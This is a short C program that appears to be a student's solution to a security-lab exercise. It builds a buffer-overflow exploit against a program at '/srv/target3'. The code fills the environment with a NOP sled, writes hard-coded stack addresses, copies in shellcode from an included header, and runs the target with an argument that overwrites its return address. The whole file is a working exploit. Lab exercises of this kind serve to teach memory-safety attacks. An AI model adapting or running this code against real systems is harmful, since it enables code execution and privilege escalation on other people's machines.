#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

const int BUFFER_SIZE = 400;
const int SHELLCODE_OFFSET = 201;
const uint32_t BASE_ADDRESS = 0xffffdec0;

void prepareEnvironment(char *environment) {
    int i;
    for (i = 0; i < BUFFER_SIZE - 1; i++) {
        environment[i] = 0x90;
    }

    *((uint32_t *)(environment)) = BASE_ADDRESS + 4;
    *((uint32_t *)(environment + 4)) = BASE_ADDRESS + 8;

    for (i = SHELLCODE_OFFSET; i < SHELLCODE_OFFSET + sizeof(shellcode); i++) {
        environment[i] = shellcode[i - SHELLCODE_OFFSET];
    }
}

int main(void)
{
    char *args[] = {
        TARGET,
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
        NULL
    };
    char environment[BUFFER_SIZE] = {0};
    prepareEnvironment(environment);
    char *env[] = {environment, NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}